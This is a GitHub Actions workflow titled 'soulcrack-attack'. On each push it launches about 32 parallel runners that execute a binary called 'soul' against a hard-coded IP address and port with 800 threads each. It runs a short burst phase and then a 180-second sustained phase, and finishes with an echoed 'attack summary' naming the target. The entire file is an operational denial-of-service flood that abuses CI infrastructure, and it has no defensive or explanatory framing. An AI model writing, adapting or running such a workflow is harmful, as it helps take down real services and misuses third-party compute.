name: soulcrack-attack

on: [push]

jobs:

  burst-phase:
    runs-on: ubuntu-22.04
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        instance: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
    steps:
      - uses: actions/checkout@v4
      - name: Prepare binary
        run: chmod +x soul 2>/dev/null || true
      - name: ğŸ”¥ Burst ${{ matrix.instance }} / 20  (10 seconds)
        continue-on-error: true
        run: timeout 12s ./soul 20.204.191.71 10107 10 800 || true

  sustained-phase:
    needs: burst-phase
    runs-on: ubuntu-22.04
    strategy:
      fail-fast: false
      max-parallel: 12
      matrix:
        chunk: [1,2,3,4,5,6,7,8,9,10,11,12]
    steps:
      - uses: actions/checkout@v4
      - name: Prepare binary
        run: chmod +x soul 2>/dev/null || true
      - name: âš¡ Sustained chunk ${{ matrix.chunk }} / 12  (180s total)
        continue-on-error: true
        run: ./soul 20.204.191.71 10107 180 800 || true

  summary:
    if: always()
    needs: [burst-phase, sustained-phase]
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo "         SOULCRACK ATTACK SUMMARY"
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
          echo "Target       : 20.204.191.71:10107"
          echo "Duration     : 180 seconds"
          echo "Threads/VM   : 800"
          echo "Parallel VMs : ~32"
          echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
